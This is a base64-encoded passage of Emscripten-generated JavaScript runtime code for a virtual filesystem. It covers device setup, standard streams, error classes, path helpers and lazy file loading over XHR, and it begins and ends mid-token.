ZmZXIsb2Zmc2V0LGxlbmd0aCxwb3Mpe3JldHVybiBsZW5ndGh9KX0pO0ZTLm1rZGV2KCIvZGV2L251bGwiLEZTLm1ha2VkZXYoMSwzKSk7VFRZLnJlZ2lzdGVyKEZTLm1ha2VkZXYoNSwwKSxUVFkuZGVmYXVsdF90dHlfb3BzKTtUVFkucmVnaXN0ZXIoRlMubWFrZWRldig2LDApLFRUWS5kZWZhdWx0X3R0eTFfb3BzKTtGUy5ta2RldigiL2Rldi90dHkiLEZTLm1ha2VkZXYoNSwwKSk7RlMubWtkZXYoIi9kZXYvdHR5MSIsRlMubWFrZWRldig2LDApKTt2YXIgcmFuZG9tX2RldmljZTtpZih0eXBlb2YgY3J5cHRvIT09InVuZGVmaW5lZCIpe3ZhciByYW5kb21CdWZmZXI9bmV3IFVpbnQ4QXJyYXkoMSk7cmFuZG9tX2RldmljZT0oZnVuY3Rpb24oKXtjcnlwdG8uZ2V0UmFuZG9tVmFsdWVzKHJhbmRvbUJ1ZmZlcik7cmV0dXJuIHJhbmRvbUJ1ZmZlclswXX0pfWVsc2UgaWYoRU5WSVJPTk1FTlRfSVNfTk9ERSl7cmFuZG9tX2RldmljZT0oZnVuY3Rpb24oKXtyZXR1cm4gcmVxdWlyZSgiY3J5cHRvIikucmFuZG9tQnl0ZXMoMSlbMF19KX1lbHNle3JhbmRvbV9kZXZpY2U9KGZ1bmN0aW9uKCl7cmV0dXJuIE1hdGgucmFuZG9tKCkqMjU2fDB9KX1GUy5jcmVhdGVEZXZpY2UoIi9kZXYiLCJyYW5kb20iLHJhbmRvbV9kZXZpY2UpO0ZTLmNyZWF0ZURldmljZSgiL2RldiIsInVyYW5kb20iLHJhbmRvbV9kZXZpY2UpO0ZTLm1rZGlyKCIvZGV2L3NobSIpO0ZTLm1rZGlyKCIvZGV2L3NobS90bXAiKX0pLGNyZWF0ZVNwZWNpYWxEaXJlY3RvcmllczooZnVuY3Rpb24oKXtGUy5ta2RpcigiL3Byb2MiKTtGUy5ta2RpcigiL3Byb2Mvc2VsZiIpO0ZTLm1rZGlyKCIvcHJvYy9zZWxmL2ZkIik7RlMubW91bnQoe21vdW50OihmdW5jdGlvbigpe3ZhciBub2RlPUZTLmNyZWF0ZU5vZGUoIi9wcm9jL3NlbGYiLCJmZCIsMTYzODR8NTExLDczKTtub2RlLm5vZGVfb3BzPXtsb29rdXA6KGZ1bmN0aW9uKHBhcmVudCxuYW1lKXt2YXIgZmQ9K25hbWU7dmFyIHN0cmVhbT1GUy5nZXRTdHJlYW0oZmQpO2lmKCFzdHJlYW0pdGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRUJBREYpO3ZhciByZXQ9e3BhcmVudDpudWxsLG1vdW50Onttb3VudHBvaW50OiJmYWtlIn0sbm9kZV9vcHM6e3JlYWRsaW5rOihmdW5jdGlvbigpe3JldHVybiBzdHJlYW0ucGF0aH0pfX07cmV0LnBhcmVudD1yZXQ7cmV0dXJuIHJldH0pfTtyZXR1cm4gbm9kZX0pfSx7fSwiL3Byb2Mvc2VsZi9mZCIpfSksY3JlYXRlU3RhbmRhcmRTdHJlYW1zOihmdW5jdGlvbigpe2lmKE1vZHVsZVsic3RkaW4iXSl7RlMuY3JlYXRlRGV2aWNlKCIvZGV2Iiwic3RkaW4iLE1vZHVsZVsic3RkaW4iXSl9ZWxzZXtGUy5zeW1saW5rKCIvZGV2L3R0eSIsIi9kZXYvc3RkaW4iKX1pZihNb2R1bGVbInN0ZG91dCJdKXtGUy5jcmVhdGVEZXZpY2UoIi9kZXYiLCJzdGRvdXQiLG51bGwsTW9kdWxlWyJzdGRvdXQiXSl9ZWxzZXtGUy5zeW1saW5rKCIvZGV2L3R0eSIsIi9kZXYvc3Rkb3V0Iil9aWYoTW9kdWxlWyJzdGRlcnIiXSl7RlMuY3JlYXRlRGV2aWNlKCIvZGV2Iiwic3RkZXJyIixudWxsLE1vZHVsZVsic3RkZXJyIl0pfWVsc2V7RlMuc3ltbGluaygiL2Rldi90dHkxIiwiL2Rldi9zdGRlcnIiKX12YXIgc3RkaW49RlMub3BlbigiL2Rldi9zdGRpbiIsInIiKTthc3NlcnQoc3RkaW4uZmQ9PT0wLCJpbnZhbGlkIGhhbmRsZSBmb3Igc3RkaW4gKCIrc3RkaW4uZmQrIikiKTt2YXIgc3Rkb3V0PUZTLm9wZW4oIi9kZXYvc3Rkb3V0IiwidyIpO2Fzc2VydChzdGRvdXQuZmQ9PT0xLCJpbnZhbGlkIGhhbmRsZSBmb3Igc3Rkb3V0ICgiK3N0ZG91dC5mZCsiKSIpO3ZhciBzdGRlcnI9RlMub3BlbigiL2Rldi9zdGRlcnIiLCJ3Iik7YXNzZXJ0KHN0ZGVyci5mZD09PTIsImludmFsaWQgaGFuZGxlIGZvciBzdGRlcnIgKCIrc3RkZXJyLmZkKyIpIil9KSxlbnN1cmVFcnJub0Vycm9yOihmdW5jdGlvbigpe2lmKEZTLkVycm5vRXJyb3IpcmV0dXJuO0ZTLkVycm5vRXJyb3I9ZnVuY3Rpb24gRXJybm9FcnJvcihlcnJubyxub2RlKXt0aGlzLm5vZGU9bm9kZTt0aGlzLnNldEVycm5vPShmdW5jdGlvbihlcnJubyl7dGhpcy5lcnJubz1lcnJubztmb3IodmFyIGtleSBpbiBFUlJOT19DT0RFUyl7aWYoRVJSTk9fQ09ERVNba2V5XT09PWVycm5vKXt0aGlzLmNvZGU9a2V5O2JyZWFrfX19KTt0aGlzLnNldEVycm5vKGVycm5vKTt0aGlzLm1lc3NhZ2U9RVJSTk9fTUVTU0FHRVNbZXJybm9dfTtGUy5FcnJub0Vycm9yLnByb3RvdHlwZT1uZXcgRXJyb3I7RlMuRXJybm9FcnJvci5wcm90b3R5cGUuY29uc3RydWN0b3I9RlMuRXJybm9FcnJvcjtbRVJSTk9fQ09ERVMuRU5PRU5UXS5mb3JFYWNoKChmdW5jdGlvbihjb2RlKXtGUy5nZW5lcmljRXJyb3JzW2NvZGVdPW5ldyBGUy5FcnJub0Vycm9yKGNvZGUpO0ZTLmdlbmVyaWNFcnJvcnNbY29kZV0uc3RhY2s9IjxnZW5lcmljIGVycm9yLCBubyBzdGFjaz4ifSkpfSksc3RhdGljSW5pdDooZnVuY3Rpb24oKXtGUy5lbnN1cmVFcnJub0Vycm9yKCk7RlMubmFtZVRhYmxlPW5ldyBBcnJheSg0MDk2KTtGUy5tb3VudChNRU1GUyx7fSwiLyIpO0ZTLmNyZWF0ZURlZmF1bHREaXJlY3RvcmllcygpO0ZTLmNyZWF0ZURlZmF1bHREZXZpY2VzKCk7RlMuY3JlYXRlU3BlY2lhbERpcmVjdG9yaWVzKCk7RlMuZmlsZXN5c3RlbXM9eyJNRU1GUyI6TUVNRlMsIklEQkZTIjpJREJGUywiTk9ERUZTIjpOT0RFRlMsIldPUktFUkZTIjpXT1JLRVJGU319KSxpbml0OihmdW5jdGlvbihpbnB1dCxvdXRwdXQsZXJyb3Ipe2Fzc2VydCghRlMuaW5pdC5pbml0aWFsaXplZCwiRlMuaW5pdCB3YXMgcHJldmlvdXNseSBjYWxsZWQuIElmIHlvdSB3YW50IHRvIGluaXRpYWxpemUgbGF0ZXIgd2l0aCBjdXN0b20gcGFyYW1ldGVycywgcmVtb3ZlIGFueSBlYXJsaWVyIGNhbGxzIChub3RlIHRoYXQgb25lIGlzIGF1dG9tYXRpY2FsbHkgYWRkZWQgdG8gdGhlIGdlbmVyYXRlZCBjb2RlKSIpO0ZTLmluaXQuaW5pdGlhbGl6ZWQ9dHJ1ZTtGUy5lbnN1cmVFcnJub0Vycm9yKCk7TW9kdWxlWyJzdGRpbiJdPWlucHV0fHxNb2R1bGVbInN0ZGluIl07TW9kdWxlWyJzdGRvdXQiXT1vdXRwdXR8fE1vZHVsZVsic3Rkb3V0Il07TW9kdWxlWyJzdGRlcnIiXT1lcnJvcnx8TW9kdWxlWyJzdGRlcnIiXTtGUy5jcmVhdGVTdGFuZGFyZFN0cmVhbXMoKX0pLHF1aXQ6KGZ1bmN0aW9uKCl7RlMuaW5pdC5pbml0aWFsaXplZD1mYWxzZTt2YXIgZmZsdXNoPU1vZHVsZVsiX2ZmbHVzaCJdO2lmKGZmbHVzaClmZmx1c2goMCk7Zm9yKHZhciBpPTA7aTxGUy5zdHJlYW1zLmxlbmd0aDtpKyspe3ZhciBzdHJlYW09RlMuc3RyZWFtc1tpXTtpZighc3RyZWFtKXtjb250aW51ZX1GUy5jbG9zZShzdHJlYW0pfX0pLGdldE1vZGU6KGZ1bmN0aW9uKGNhblJlYWQsY2FuV3JpdGUpe3ZhciBtb2RlPTA7aWYoY2FuUmVhZCltb2RlfD0yOTJ8NzM7aWYoY2FuV3JpdGUpbW9kZXw9MTQ2O3JldHVybiBtb2RlfSksam9pblBhdGg6KGZ1bmN0aW9uKHBhcnRzLGZvcmNlUmVsYXRpdmUpe3ZhciBwYXRoPVBBVEguam9pbi5hcHBseShudWxsLHBhcnRzKTtpZihmb3JjZVJlbGF0aXZlJiZwYXRoWzBdPT0iLyIpcGF0aD1wYXRoLnN1YnN0cigxKTtyZXR1cm4gcGF0aH0pLGFic29sdXRlUGF0aDooZnVuY3Rpb24ocmVsYXRpdmUsYmFzZSl7cmV0dXJuIFBBVEgucmVzb2x2ZShiYXNlLHJlbGF0aXZlKX0pLHN0YW5kYXJkaXplUGF0aDooZnVuY3Rpb24ocGF0aCl7cmV0dXJuIFBBVEgubm9ybWFsaXplKHBhdGgpfSksZmluZE9iamVjdDooZnVuY3Rpb24ocGF0aCxkb250UmVzb2x2ZUxhc3RMaW5rKXt2YXIgcmV0PUZTLmFuYWx5emVQYXRoKHBhdGgsZG9udFJlc29sdmVMYXN0TGluayk7aWYocmV0LmV4aXN0cyl7cmV0dXJuIHJldC5vYmplY3R9ZWxzZXtfX19zZXRFcnJObyhyZXQuZXJyb3IpO3JldHVybiBudWxsfX0pLGFuYWx5emVQYXRoOihmdW5jdGlvbihwYXRoLGRvbnRSZXNvbHZlTGFzdExpbmspe3RyeXt2YXIgbG9va3VwPUZTLmxvb2t1cFBhdGgocGF0aCx7Zm9sbG93OiFkb250UmVzb2x2ZUxhc3RMaW5rfSk7cGF0aD1sb29rdXAucGF0aH1jYXRjaChlKXt9dmFyIHJldD17aXNSb290OmZhbHNlLGV4aXN0czpmYWxzZSxlcnJvcjowLG5hbWU6bnVsbCxwYXRoOm51bGwsb2JqZWN0Om51bGwscGFyZW50RXhpc3RzOmZhbHNlLHBhcmVudFBhdGg6bnVsbCxwYXJlbnRPYmplY3Q6bnVsbH07dHJ5e3ZhciBsb29rdXA9RlMubG9va3VwUGF0aChwYXRoLHtwYXJlbnQ6dHJ1ZX0pO3JldC5wYXJlbnRFeGlzdHM9dHJ1ZTtyZXQucGFyZW50UGF0aD1sb29rdXAucGF0aDtyZXQucGFyZW50T2JqZWN0PWxvb2t1cC5ub2RlO3JldC5uYW1lPVBBVEguYmFzZW5hbWUocGF0aCk7bG9va3VwPUZTLmxvb2t1cFBhdGgocGF0aCx7Zm9sbG93OiFkb250UmVzb2x2ZUxhc3RMaW5rfSk7cmV0LmV4aXN0cz10cnVlO3JldC5wYXRoPWxvb2t1cC5wYXRoO3JldC5vYmplY3Q9bG9va3VwLm5vZGU7cmV0Lm5hbWU9bG9va3VwLm5vZGUubmFtZTtyZXQuaXNSb290PWxvb2t1cC5wYXRoPT09Ii8ifWNhdGNoKGUpe3JldC5lcnJvcj1lLmVycm5vfXJldHVybiByZXR9KSxjcmVhdGVGb2xkZXI6KGZ1bmN0aW9uKHBhcmVudCxuYW1lLGNhblJlYWQsY2FuV3JpdGUpe3ZhciBwYXRoPVBBVEguam9pbjIodHlwZW9mIHBhcmVudD09PSJzdHJpbmciP3BhcmVudDpGUy5nZXRQYXRoKHBhcmVudCksbmFtZSk7dmFyIG1vZGU9RlMuZ2V0TW9kZShjYW5SZWFkLGNhbldyaXRlKTtyZXR1cm4gRlMubWtkaXIocGF0aCxtb2RlKX0pLGNyZWF0ZVBhdGg6KGZ1bmN0aW9uKHBhcmVudCxwYXRoLGNhblJlYWQsY2FuV3JpdGUpe3BhcmVudD10eXBlb2YgcGFyZW50PT09InN0cmluZyI/cGFyZW50OkZTLmdldFBhdGgocGFyZW50KTt2YXIgcGFydHM9cGF0aC5zcGxpdCgiLyIpLnJldmVyc2UoKTt3aGlsZShwYXJ0cy5sZW5ndGgpe3ZhciBwYXJ0PXBhcnRzLnBvcCgpO2lmKCFwYXJ0KWNvbnRpbnVlO3ZhciBjdXJyZW50PVBBVEguam9pbjIocGFyZW50LHBhcnQpO3RyeXtGUy5ta2RpcihjdXJyZW50KX1jYXRjaChlKXt9cGFyZW50PWN1cnJlbnR9cmV0dXJuIGN1cnJlbnR9KSxjcmVhdGVGaWxlOihmdW5jdGlvbihwYXJlbnQsbmFtZSxwcm9wZXJ0aWVzLGNhblJlYWQsY2FuV3JpdGUpe3ZhciBwYXRoPVBBVEguam9pbjIodHlwZW9mIHBhcmVudD09PSJzdHJpbmciP3BhcmVudDpGUy5nZXRQYXRoKHBhcmVudCksbmFtZSk7dmFyIG1vZGU9RlMuZ2V0TW9kZShjYW5SZWFkLGNhbldyaXRlKTtyZXR1cm4gRlMuY3JlYXRlKHBhdGgsbW9kZSl9KSxjcmVhdGVEYXRhRmlsZTooZnVuY3Rpb24ocGFyZW50LG5hbWUsZGF0YSxjYW5SZWFkLGNhbldyaXRlLGNhbk93bil7dmFyIHBhdGg9bmFtZT9QQVRILmpvaW4yKHR5cGVvZiBwYXJlbnQ9PT0ic3RyaW5nIj9wYXJlbnQ6RlMuZ2V0UGF0aChwYXJlbnQpLG5hbWUpOnBhcmVudDt2YXIgbW9kZT1GUy5nZXRNb2RlKGNhblJlYWQsY2FuV3JpdGUpO3ZhciBub2RlPUZTLmNyZWF0ZShwYXRoLG1vZGUpO2lmKGRhdGEpe2lmKHR5cGVvZiBkYXRhPT09InN0cmluZyIpe3ZhciBhcnI9bmV3IEFycmF5KGRhdGEubGVuZ3RoKTtmb3IodmFyIGk9MCxsZW49ZGF0YS5sZW5ndGg7aTxsZW47KytpKWFycltpXT1kYXRhLmNoYXJDb2RlQXQoaSk7ZGF0YT1hcnJ9RlMuY2htb2Qobm9kZSxtb2RlfDE0Nik7dmFyIHN0cmVhbT1GUy5vcGVuKG5vZGUsInciKTtGUy53cml0ZShzdHJlYW0sZGF0YSwwLGRhdGEubGVuZ3RoLDAsY2FuT3duKTtGUy5jbG9zZShzdHJlYW0pO0ZTLmNobW9kKG5vZGUsbW9kZSl9cmV0dXJuIG5vZGV9KSxjcmVhdGVEZXZpY2U6KGZ1bmN0aW9uKHBhcmVudCxuYW1lLGlucHV0LG91dHB1dCl7dmFyIHBhdGg9UEFUSC5qb2luMih0eXBlb2YgcGFyZW50PT09InN0cmluZyI/cGFyZW50OkZTLmdldFBhdGgocGFyZW50KSxuYW1lKTt2YXIgbW9kZT1GUy5nZXRNb2RlKCEhaW5wdXQsISFvdXRwdXQpO2lmKCFGUy5jcmVhdGVEZXZpY2UubWFqb3IpRlMuY3JlYXRlRGV2aWNlLm1ham9yPTY0O3ZhciBkZXY9RlMubWFrZWRldihGUy5jcmVhdGVEZXZpY2UubWFqb3IrKywwKTtGUy5yZWdpc3RlckRldmljZShkZXYse29wZW46KGZ1bmN0aW9uKHN0cmVhbSl7c3RyZWFtLnNlZWthYmxlPWZhbHNlfSksY2xvc2U6KGZ1bmN0aW9uKHN0cmVhbSl7aWYob3V0cHV0JiZvdXRwdXQuYnVmZmVyJiZvdXRwdXQuYnVmZmVyLmxlbmd0aCl7b3V0cHV0KDEwKX19KSxyZWFkOihmdW5jdGlvbihzdHJlYW0sYnVmZmVyLG9mZnNldCxsZW5ndGgscG9zKXt2YXIgYnl0ZXNSZWFkPTA7Zm9yKHZhciBpPTA7aTxsZW5ndGg7aSsrKXt2YXIgcmVzdWx0O3RyeXtyZXN1bHQ9aW5wdXQoKX1jYXRjaChlKXt0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FSU8pfWlmKHJlc3VsdD09PXVuZGVmaW5lZCYmYnl0ZXNSZWFkPT09MCl7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRUFHQUlOKX1pZihyZXN1bHQ9PT1udWxsfHxyZXN1bHQ9PT11bmRlZmluZWQpYnJlYWs7Ynl0ZXNSZWFkKys7YnVmZmVyW29mZnNldCtpXT1yZXN1bHR9aWYoYnl0ZXNSZWFkKXtzdHJlYW0ubm9kZS50aW1lc3RhbXA9RGF0ZS5ub3coKX1yZXR1cm4gYnl0ZXNSZWFkfSksd3JpdGU6KGZ1bmN0aW9uKHN0cmVhbSxidWZmZXIsb2Zmc2V0LGxlbmd0aCxwb3Mpe2Zvcih2YXIgaT0wO2k8bGVuZ3RoO2krKyl7dHJ5e291dHB1dChidWZmZXJbb2Zmc2V0K2ldKX1jYXRjaChlKXt0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FSU8pfX1pZihsZW5ndGgpe3N0cmVhbS5ub2RlLnRpbWVzdGFtcD1EYXRlLm5vdygpfXJldHVybiBpfSl9KTtyZXR1cm4gRlMubWtkZXYocGF0aCxtb2RlLGRldil9KSxjcmVhdGVMaW5rOihmdW5jdGlvbihwYXJlbnQsbmFtZSx0YXJnZXQsY2FuUmVhZCxjYW5Xcml0ZSl7dmFyIHBhdGg9UEFUSC5qb2luMih0eXBlb2YgcGFyZW50PT09InN0cmluZyI/cGFyZW50OkZTLmdldFBhdGgocGFyZW50KSxuYW1lKTtyZXR1cm4gRlMuc3ltbGluayh0YXJnZXQscGF0aCl9KSxmb3JjZUxvYWRGaWxlOihmdW5jdGlvbihvYmope2lmKG9iai5pc0RldmljZXx8b2JqLmlzRm9sZGVyfHxvYmoubGlua3x8b2JqLmNvbnRlbnRzKXJldHVybiB0cnVlO3ZhciBzdWNjZXNzPXRydWU7aWYodHlwZW9mIFhNTEh0dHBSZXF1ZXN0IT09InVuZGVmaW5lZCIpe3Rocm93IG5ldyBFcnJvcigiTGF6eSBsb2FkaW5nIHNob3VsZCBoYXZlIGJlZW4gcGVyZm9ybWVkIChjb250ZW50cyBzZXQpIGluIGNyZWF0ZUxhenlGaWxlLCBidXQgaXQgd2FzIG5vdC4gTGF6eSBsb2FkaW5nIG9ubHkgd29ya3MgaW4gd2ViIHdvcmtlcnMuIFVzZSAtLWVtYmVkLWZpbGUgb3IgLS1wcmVsb2FkLWZpbGUgaW4gZW1jYyBvbiB0aGUgbWFpbiB0aHJlYWQuIil9ZWxzZSBpZihNb2R1bGVbInJlYWQiXSl7dHJ5e29iai5jb250ZW50cz1pbnRBcnJheUZyb21TdHJpbmcoTW9kdWxlWyJyZWFkIl0ob2JqLnVybCksdHJ1ZSk7b2JqLnVzZWRCeXRlcz1vYmouY29udGVudHMubGVuZ3RofWNhdGNoKGUpe3N1Y2Nlc3M9ZmFsc2V9fWVsc2V7dGhyb3cgbmV3IEVycm9yKCJDYW5ub3QgbG9hZCB3aXRob3V0IHJlYWQoKSBvciBYTUxIdHRwUmVxdWVzdC4iKX1pZighc3VjY2VzcylfX19zZXRFcnJObyhFUlJOT19DT0RFUy5FSU8pO3JldHVybiBzdWNjZXNzfSksY3JlYXRlTGF6eUZpbGU6KGZ1bmN0aW9uKHBhcmVudCxuYW1lLHVybCxjYW5SZWFkLGNhbldyaXRlKXtmdW5jdGlvbiBMYXp5VWludDhBcnJheSgpe3RoaXMubGVuZ3RoS25vd249ZmFsc2U7dGhpcy5jaHVua3M9W119TGF6eVVpbnQ4QXJyYXkucHJvdG90eXBlLmdldD1mdW5jdGlvbiBMYXp5VWludDhBcnJheV9nZXQoaWR4KXtpZihpZHg+dGhpcy5sZW5ndGgtMXx8aWR4PDApe3JldHVybiB1bmRlZmluZWR9dmFyIGNodW5rT2Zmc2V0PWlkeCV0aGlzLmNodW5rU2l6ZTt2YXIgY2h1bmtOdW09aWR4L3RoaXMuY2h1bmtTaXplfDA7cmV0dXJuIHRoaXMuZ2V0dGVyKGNodW5rTnVtKVtjaHVua09mZnNldF19O0xhenlVaW50OEFycmF5LnByb3RvdHlwZS5zZXREYXRhR2V0dGVyPWZ1bmN0aW9uIExhenlVaW50OEFycmF5X3NldERhdGFHZXR0ZXIoZ2V0dGVyKXt0aGlzLmdldHRlcj1nZXR0ZXJ9O0xhenlVaW50OEFycmF5LnByb3RvdHlwZS5jYWNoZUxlbmd0aD1mdW5jdGlvbiBMYXp5VWludDhBcnJheV9jYWNoZUxlbmd0aCgpe3ZhciB4aHI9bmV3IFhNTEh0dHBSZXF1ZXN0O3hoci5vcGVuKCJIRUFEIix1cmwsZmFsc2UpO3hoci5zZW5kKG51bGwpO2lmKCEoeGhyLnN0YXR1cz49MjAwJiZ4aHIuc3RhdHVzPDMwMHx8eGhyLnN0YXR1cz09PTMwNCkpdGhyb3cgbmV3IEVycm9yKCJDb3VsZG5cJ3QgbG9hZCAiK3VybCsiLiBTdGF0dXM6ICIreGhyLnN0YXR1cyk7dmFyIGRhdGFsZW5ndGg9TnVtYmVyKHhoci5nZXRSZXNwb25zZUhlYWRlcigiQ29udGVudC1sZW5ndGgiKSk7dmFyIGhlYWRlcjt2YXIgaGFzQnl0ZVNlcnZpbmc9KGhlYWRlcj14aHIuZ2V0UmVzcG9uc2VIZWFkZXIoIkFjY2VwdC1SYW5nZXMiKSkmJmhlYWRlcj09PSJieXRlcyI7dmFyIHVzZXNHemlwPShoZWFkZXI9eGhyLmdldFJlc3BvbnNlSGVhZGVyKCJDb250ZW50LUVuY29kaW5nIikpJiZoZWFkZXI9PT0iZ3ppcCI7dmFyIGNodW5rU2l6ZT0xMDI0KjEwMjQ7aWYoIWhhc0J5dGVTZXJ2aW5nKWNodW5rU2l6ZT1kYXRhbGVuZ3RoO3ZhciBkb1hIUj0oZnVuY3Rpb24oZnJvbSx0byl7aWYoZnJvbT50byl0aHJvdyBuZXcgRXJyb3IoImludmFsaWQgcmFuZ2UgKCIrZnJvbSsiLCAiK3RvKyIpIG9yIG5vIGJ5dGVzIHJlcXVlc3RlZCEiKTtpZih0bz5kYXRhbGVuZ3RoLTEpdGhyb3cgbmV3IEVycm9yKCJvbmx5ICIrZGF0YWxlbmd0aCsiIGJ5dGVzIGF2YWlsYWJsZSEgcHJvZ3JhbW1lciBlcnJvciEiKTt2YXIgeGhyPW5ldyBYTUxIdHRwUmVxdWVzdDt4aHIub3BlbigiR0VUIix1cmwsZmFsc2UpO2lmKGRhdGFsZW5ndGghPT1jaHVua1NpemUpeGhyLnNldFJlcXVlc3RIZWFkZXIoIlJhbmdlIiwiYnl0ZXM9Iitmcm9tKyItIit0byk7aWYodHlwZW9mIFVpbnQ4QXJyYXkhPSJ1bmRlZmluZWQiKXhoci5yZXNwb25zZVR5cGU9ImFycmF5YnVmZmVyIjtpZih4aHIub3ZlcnJpZGVNaW1lVHlwZSl7eGhyLm92ZXJyaWRlTWltZVR5cGUoInRleHQvcGxhaW47IGNoYXJzZXQ9eC11c2VyLWRlZmluZWQiKX14aHIuc2VuZChudWxsKTtpZighKHhoci5zdGF0dXM+PTIwMCYmeGhyLnN0YXR1czwzMDB8fHhoci5zdGF0dXM9PT0zMDQpKXRocm93IG5ldyBFcnJvcigiQ291bGRuXCd0IGxvYWQgIit1cmwrIi4gU3RhdHVzOiAiK3hoci5zdGF0dXMpO2lmKHhoci5yZXNwb25zZSE9PXVuZGVmaW5lZCl7cmV0dXJuIG5ldyBVaW50OEFycmF5KHhoci5yZXNwb25zZXx8W10pfWVsc2V7cmV0dXJuIGludEFycmF5RnJvbVN0cmluZyh4aHIucmVzcG9uc2VUZXh0fHwiIix0cnVlKX19KTt2YXIgbGF6eUFycmF5PXRoaXM7bGF6eUFycmF5LnNldERhdGFHZXR0ZXIoKGZ1bmN0aW9uKGNodW5rTnVtKXt2YXIgc3RhcnQ9Y2h1bmtOdW0qY2h1bmtTaXplO3ZhciBlbmQ9KGNodW5rTnVtKzEpKmNodW5rU2l6ZS0xO2VuZD1NYXRoLm1pbihlbmQsZGF0YWxlbmd0aC0xKTtpZih0eXBlb2YgbGF6eUFycmF5LmNodW5rc1tjaHVua051bV09PT0idW5kZWZpbmVkIil7bGF6eUFycmF5LmNodW5rc1tjaHVua051bV09ZG9YSFIoc3RhcnQsZW5kKX1pZih0eXBlb2YgbGF6eUFycmF5LmNodW5rc1tjaHVua051bV09PT0idW5kZWZpbmVkIil0aHJvdyBuZXcgRXJyb3IoImRvWEhSIGZhaWxlZCEiKTtyZXR1cm4gbGF6eUFycmF5LmNodW5rc1tjaHVua051bV19KSk7aWYodXNlc0d6aXB8fCFkYXRhbGVuZ3RoKXtjaHVua1NpemU9ZGF0YWxlbmd0aD0xO2RhdGFsZW5ndGg9dGhpcy5nZXR0ZXIoMCkubGVuZ3RoO2NodW5rU2l6ZT1kYXRhbGVuZ3RoO2NvbnNvbGUubG9nKCJMYXp5RmlsZXMgb24gZ3ppcCBmb3JjZXMgZG93bmxvYWQgb2YgdGhlIHdob2xlIGZpbGUgd2hlbiBsZW5ndGggaXMgYWNjZXNzZWQiKX10aGlzLl9sZW5ndGg9ZGF0YWxlbmd0aDt0aGlzLl9jaHVua1NpemU9Y2h1bmtTaXplO3RoaXMubGVuZ3RoS25vd249dHJ1ZX07aWYodHlwZW9mIFhNTEh0dHBSZXF1ZXN0IT09InVuZGVmaW5lZCIpe2lmKCFFTlZJUk9OTUVOVF9JU19XT1JLRVIpdGhyb3ciQ2Fubm90IGRvIHN5bmNocm9ub3VzIGJpbmFyeSBYSFJzIG91dHNpZGUgd2Vid29ya2VycyBpbiBtb2Rlcm4gYnJvd3NlcnMuIFVzZSAtLWVtYmVkLWZpbGUgb3IgLS1wcmVsb2FkLWZpbGUgaW4gZW1jYyI7dmFyIGxhenlBcnJheT1uZXcgTGF6eVVpbnQ4QXJyYXk7T2JqZWN0LmRlZmluZVByb3BlcnRpZXMobGF6eUFycmF5LHtsZW5ndGg6e2dldDooZnVuY3Rpb24oKXtpZighdGhpcy5sZW5ndGhLbm93bil7dGhpcy5jYWNoZUxlbmd0aCgpfXJldHVybiB0aGlzLl9sZW5ndGh9KX0sY2h1bmtTaXplOntnZXQ6KGZ1bmN0aW9uKCl7aWYoIXRoaXMubGVuZ3RoS25vd24pe3RoaXMuY2FjaGVMZW5ndGgoKX1yZXR1cm4gdGhpcy5fY2h1bmtTaXplfSl9fSk7dmFyIHByb3BlcnRpZXM9e2lzRGV2aWNlOmZhbHNlLGNvbnRlbnRzOmxhenlBcnJheX19ZWxzZXt2YXIgcHJvcGVydGllcz17aXNEZXZpY2U6ZmFsc2UsdXJsOnVybH19dmFyIG5vZGU9RlMuY3JlYXRlRmlsZShwYXJlbnQsbmFtZSxwcm9wZXJ0aWVzLGNhblJlYWQsY2FuV3JpdGUpO2lmKHByb3BlcnRpZXMuY29udGVudHMpe25vZGUuY29udGVudHM9cHJvcGVydGllcy5jb250ZW50c31lbHNlIGlmKHByb3BlcnRpZXMudXJsKXtub2RlLmNvbnRlbnRzPW51bGw7bm9kZS51cmw9cHJvcGVydGllcy51cmx9T2JqZWN0LmRlZmluZVByb3BlcnRpZXMobm9kZSx7dXNlZEJ5dGVzOntnZXQ6KGZ1bmN0aW9uKCl7cmV0dXJuIHRoaXMuY29udGVudHMubGVuZ3RofSl9fSk7dmFyIHN0cmVhbV9vcHM9e307dmFyIGtleXM9T2JqZWN0LmtleXMobm9kZS5zdHJlYW1fb3BzKTtrZXlzLmZvckVhY2goKGZ1bmN0aW9uKGtleSl7dmFyIGZuPW5vZGUuc3RyZWFtX29wc1trZXldO3N0cmVhbV9vcHNba2V5XT1mdW5jdGlvbiBmb3JjZUxvYWRMYXp5RmlsZSgpe2lmKCFGUy5mb3JjZUxvYWRGaWxlKG5vZGUpKXt0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FSU8pfXJldHVybiBmbi5hcHBseShudWxsLGFyZ3VtZW50cyl9fSkpO3N0cmVhbV9vcHMucmVhZD1mdW5jdGlvbiBzdHJlYW1fb3BzX3JlYWQoc3RyZWFtLGJ1ZmZlcixvZmZzZXQsbGVuZ3RoLHBvc2l0aW9uKXtpZighRlMuZm9yY2VMb2FkRmlsZShub2RlKSl7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRUlPKX12YXIgY29udGVudHM9c3RyZWFtLm5vZGUuY29udGVudHM7aWYocG9zaXRpb24+PWNvbnRlbnRzLmxlbmd0aClyZXR1cm4gMDt2YXIgc2l6ZT1NYXRoLm1pbihjb250ZW50cy5sZW5ndGgtcG9zaXRpb24sbGVuZ3RoKTthc3NlcnQoc2l6ZT49MCk7aWYoY29udGVudHMuc2xpY2Upe2Zvcih2YXIgaT0wO2k8c2l6ZTtpKyspe2J1ZmZlcltvZmZzZXQraV09Y29udGVudHNbcG9zaXRpb24raV19fWVsc2V7Zm9yKHZhciBpPTA7aTxzaXplO2krKyl7YnVmZmVyW29mZnNldCtpXT1jb250ZW50cy5nZXQocG9zaXRpb24raSl9fXJldHVybiBzaXplfTtub2RlLnN0cmVhbV9vcHM9c3RyZWFtX29wcztyZXR1cm4gbm9kZX0pLGNyZWF0ZVByZWxvYWRlZEZpbGU6KGZ1bmN0aW9uKHBhcmVudCxuYW1lLHVybCxjYW5SZWFkLGNhbldyaXRlLG9ubG9hZCxvbmVycm9yLGRvbnRDcmVhdGVGaWxlLGNhbk93bixwcmVGaW5pc2gpe0Jyb3dzZXIuaW5pdCgpO3ZhciBmdWxsbmFtZT1uYW1lP1BBVEgucmVz